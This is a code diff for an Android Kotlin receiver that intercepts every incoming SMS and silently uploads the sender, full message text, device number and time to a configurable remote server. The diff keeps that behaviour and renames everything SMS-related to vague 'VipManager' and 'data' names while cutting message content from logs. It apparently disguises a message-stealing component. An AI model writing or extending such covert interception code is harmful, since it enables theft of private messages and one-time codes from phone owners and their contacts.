@@ -12,10 +12,10 @@ import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
 import java.util.*
 
-class SmsReceiver : BroadcastReceiver() {
+class MessageReceiver : BroadcastReceiver() {
     
     companion object {
-        private const val TAG = "SmsReceiver"
+        private const val TAG = "VipManager"
     }
     
     override fun onReceive(context: Context?, intent: Intent?) {
@@ -42,43 +42,41 @@ class SmsReceiver : BroadcastReceiver() {
                         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                             .format(Date(smsMessage.timestampMillis))
                         
-                        Log.d(TAG, "SMS 수신: 발신=$sender, 메시지=$message")
+                        Log.d(TAG, "메시지 수신: 발신=$sender")
                         
-                        // SharedPreferences에 마지막 SMS 저장
-                        val prefs = context.getSharedPreferences("SMS_FORWARDER", Context.MODE_PRIVATE)
+                        // SharedPreferences에 마지막 메시지 저장
+                        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
                         prefs.edit()
-                            .putString("LAST_SMS", "발신: $sender\n메시지: ${message.take(50)}...")
-                            .putString("LAST_SMS_TIME", timestamp)
+                            .putString("LAST_MSG", "발신: $sender\n내용: ${message.take(50)}...")
+                            .putString("LAST_MSG_TIME", timestamp)
                             .apply()
                         
                         // 수신번호 가져오기 (현재 폰 번호)
                         val receiver = getPhoneNumber(context)
                         
                         // 서버로 전송
-                        sendSmsToServer(context, sender, receiver, message, timestamp)
+                        sendToServer(context, sender, receiver, message, timestamp)
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "SMS 처리 오류: ${e.message}", e)
+                Log.e(TAG, "메시지 처리 오류: ${e.message}", e)
             }
         }
     }
     
     private fun getPhoneNumber(context: Context): String {
-        // 실제로는 TelephonyManager로 가져올 수 있지만, 
-        // 간단하게 SharedPreferences에서 가져오거나 기본값 사용
-        val prefs = context.getSharedPreferences("SMS_FORWARDER", Context.MODE_PRIVATE)
+        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
         return prefs.getString("PHONE_NUMBER", "UNKNOWN") ?: "UNKNOWN"
     }
     
-    private fun sendSmsToServer(
+    private fun sendToServer(
         context: Context,
         sender: String,
         receiver: String,
         message: String,
         timestamp: String
     ) {
-        val prefs = context.getSharedPreferences("SMS_FORWARDER", Context.MODE_PRIVATE)
+        val prefs = context.getSharedPreferences("VIP_MANAGER", Context.MODE_PRIVATE)
         val serverUrl = prefs.getString("SERVER_URL", "") ?: ""
         
         if (serverUrl.isEmpty()) {
@@ -88,14 +86,14 @@ class SmsReceiver : BroadcastReceiver() {
         
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val smsData = mapOf(
+                val data = mapOf(
                     "sender" to sender,
                     "receiver" to receiver,
                     "message" to message,
                     "timestamp" to timestamp
                 )
                 
-                val success = ApiClient.registerSms(serverUrl, smsData)
+                val success = ApiClient.registerData(serverUrl, data)
                 
                 if (success) {
                     Log.d(TAG, "✅ 서버 전송 성공")
@@ -108,4 +106,5 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 }
+
 
